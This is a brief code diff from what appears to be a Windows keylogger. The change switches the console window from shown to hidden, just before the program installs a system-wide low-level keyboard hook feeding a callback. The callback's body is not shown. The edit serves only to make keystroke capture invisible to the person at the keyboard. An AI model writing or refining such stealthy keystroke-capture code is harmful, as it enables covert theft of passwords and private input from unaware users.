@@ -47,7 +47,7 @@ LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 int main()
 {   
     //Hide console window
-    ShowWindow(GetConsoleWindow(), SW_SHOW);
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     //Setup low level keyboard hook
     _hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
